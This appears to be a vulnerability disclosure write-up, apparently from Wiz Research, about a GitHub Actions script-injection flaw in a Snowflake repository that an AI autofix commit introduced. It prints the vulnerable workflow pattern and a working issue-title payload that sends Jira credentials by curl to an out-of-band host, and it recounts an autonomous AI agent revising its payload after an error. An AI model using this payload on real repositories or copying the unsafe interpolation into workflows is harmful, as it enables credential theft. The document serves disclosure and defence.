@@ -1,0 +1,174 @@
+As part of ongoing security research conducted through Snowflake’s HackerOne vulnerability disclosure program, Wiz Research’s "Red Agent"—an autonomous, AI-powered security research tool—identified a critical GitHub Actions workflow vulnerability in one of Snowflake’s public repositories.
+This incident highlights a rapidly emerging reality in software development: 
+how AI coding assistants can inadvertently introduce workflow injection vulnerabilities, and how automated AI agents can rapidly surface them in the wild.
+Upon responsible disclosure on June 23, 2026 by Wiz, Snowflake remediated the vulnerability on the same day, rotated the affected credential, and verified via detailed audit logs that Wiz was the sole actor during the exposure window. Wiz confirmed that all data accessed during proof-of-concept testing was securely deleted.
+Executive Summary
+Wiz Red Agent identified a script injection vulnerability in 
+snowflakedb/snowflake-connector-net
+. The issue allowed an unauthenticated user to execute arbitrary commands within a GitHub Actions runner by opening a GitHub issue with a specially crafted title.
+Crucially, the vulnerability was introduced on June 18, 2026—just five days prior to discovery—via a commit co-authored by 
+Copilot Autofix powered by AI
+ (
+PR #1218
+). The AI assistant removed the repository's existing sanitized input pattern and replaced it with direct string expansion in a shell script.
+Screenshot demonstrating access to Snowflake's Jira portal, via an exfiltrated token
+Exposure Walk-Through
+Discovery
+Wiz Red Agent's CI/CD capability scanned Snowflake's GitHub organization and flagged the 
+jira_issue.yml
+ Workflow in 
+snowflakedb/snowflake-connector-net
+ as vulnerable to script injection via untrusted input in 
+run:
+ blocks. 
+AI Assistant (Github Copilot) Change
+- 
+env
+:
+
+  - 
+ISSUE_TITLE
+:
+ ${{ github.event.issue.title }}
+
+- 
+run
+:
+ jq -n --arg title "$ISSUE_TITLE" ...
+
++ run
+:
+ TITLE=$(echo '${{ github.event.issue.title }}' | sed ...)
+The workflow triggered on 
+issues: opened
+ - meaning any GitHub user could fire it by opening an issue - and interpolated the attacker-controlled issue title directly into a shell script:
+run
+:
+ |
+ TITLE=$(echo '${{ github.event.issue.title }}' | sed 's/"/\\"/g' | sed "s/'/\\\'/g") 
+The 
+sed
+ escaping runs after GitHub's template expansion, a single quote in the title breaks out of 
+echo '...'
+ and allows arbitrary command execution.
+The injectable pattern was introduced just days earlier, on June 18, 2026, 
+commit 4a1b8ce
+ (
+PR #1218: “SNOW-2069227: Update jira workflows”
+) - co-authored by 
+Copilot Autofix powered by AI
+. 
+The commit introducing the vulnerable pattern
+It removed the repository’s existing safe pattern, which passed the issue title through an 
+env:
+ variable and built the JSON payload with 
+jq
+. Instead it used the direct 
+${{ github.event.issue.title }} 
+interpolation shown above. In other words, an AI “autofix” commit created the very injection vector.
+The code change introducing the vulnerable pattern
+The Open “Security Gate”
+The workflow had an 
+if:
+ condition that appeared protective:
+if
+:
+ (github.event_name == 'issues' && github.event.pull_request.user.login != 'whitesource-for-github-com[bot]')
+However, on issues events, 
+github.event.pull_request
+ is always 
+null
+. 
+So the condition reduces to (
+null != 'whitesource-for-github-com[bot]'
+). This is always true, and every GitHub user passes the gate.
+The Open “Security Gate”
+Exploitation
+We crafted an issue title that, after template expansion, breaks out of the echo string and exfiltrates the Jira credentials via an out-of-band callback:
+Crucially, when Red Agent’s cicd capability initially attempted exfiltration using a standard comment character (
+#
+), the runner returned a bash syntax error because the comment consumed the closing parenthetical of 
+TITLE=$(...)
+. Rather than stopping or failing, Red Agent:
+autonomously analyzed the syntax execution error
+adjusted its payload to use 
+; echo '
+ to properly close the shell block, and 
+successfully received the out-of-band callback
+' ; curl -s "https://subdomain.oast.me?t=`printf %s $JIRA_API_TOKEN|base64 -w0`&e=`printf %s $JIRA_USER_EMAIL|base64 -w0`&u=`printf %s $JIRA_BASE_URL|base64 -w0`" ; echo '
+Within seconds, our listener received the callback from a GitHub Actions runner (Azure IP 
+20.106.182.197
+) containing base64-encoded credentials.
+The POC PR with payload in the Issue title
+Note:
+ Our first attempt used 
+#
+ to comment out the rest of the line, which caused an unexpected EOF bash error because it also ate the closing 
+)
+ of 
+TITLE=$(...)
+. The fix was using 
+; echo '
+ to properly close the shell syntax.
+The workflow log showing successful exploitation
+The exfiltrated token linked to qa@snowflake.net
+The exfiltrated token authenticated as 
+qa@snowflake.net
+ to 
+snowflakecomputing.atlassian.net
+, granting read access across Snowflake's engineering, security compliance, and bug bounty tracking projects.
+Remediation & Forensics
+Same-Day Patching:
+ Snowflake patched the workflow on June 23, 2026 (
+1dc7766
+, PR #1402), fully restoring the safe 
+env:
+ variable and 
+jq --arg
+ parsing pattern.
+Credential Revocation:
+ The JIRA token in question was revoked and rotated.
+Forensic Verification:
+ Comprehensive audit log analysis confirmed that no external third parties accessed the endpoint during the 5-day exposure window. All anomalous queries were strictly matched to Wiz's testing IPs.
+Key Takeaways
+AI Code Generation Demands Rigorous Oversight:
+ AI coding tools predict code based on probabilistic patterns, which can inadvertently reintroduce deprecated or insecure shell patterns. AI-generated PRs must undergo the same static analysis and security scrutiny as human code.
+Collapsing Discovery Windows:
+ The vulnerability was live for only five days before an automated agent discovered and validated it. Security operations must adapt to a landscape where automated discovery occurs in hours, requiring rapid patch cycles and short-lived credentials.
+Preventing AI Security Regressions:
+ Automated AI assistants often lack historical context regarding why specific code patterns were chosen. In this incident, an automated PR removed a safe env: + jq parsing pattern that had been explicitly implemented to prevent shell injection. Security teams must implement Guardrails that block AI agents from replacing structured data parsers with direct string interpolation.
+Disclosure Timeline 
+June 18, 2026 - 
+Script-injection pattern introduced in 
+jira_issue.yml
+ by commit 
+4a1b8ce
+ (PR #1218), co-authored by 
+Copilot Autofix powered by AI
+June 23, 2026
+ - Wiz identified, exploited, and reported vulnerability to Snowflake via HackerOne (report #3819931)
+June 23, 2026
+ - Slack notification sent to Snowflake security team
+June 23, 2026 (same day)
+ - Snowflake patches the vulnerable script-injection workflow (
+commit 1dc7766
+, 
+PR #1402
+), restoring the safe 
+env:
+ + 
+jq --arg
+ pattern. 
+June 24, 2026
+ - Jira token rotated
+July 25, 2026
+ - Public disclosure deadline (30 days after the June 25 resolution, per Snowflake’s disclosure policy)
+Snowflake’s Response
+Snowflake appreciates Wiz's responsible reporting of and collaboration around these findings through our vulnerability disclosure and bug bounty program, HackerOne. Wiz Research reported a security vulnerability in one of Snowflake's public GitHub repositories. The disclosure was received on June 23, 2026, and it was immediately investigated and remediated, and our investigation found no evidence of unauthorized access. Protecting our systems remains a top priority, and we remain committed to continually strengthening our software development and security practices. We are working together with Wiz to share these learnings with the broader industry to encourage widespread adoption of these security best practices.
+Tags
+#
+Research
+#
+AI
+#
+Wiz Agents
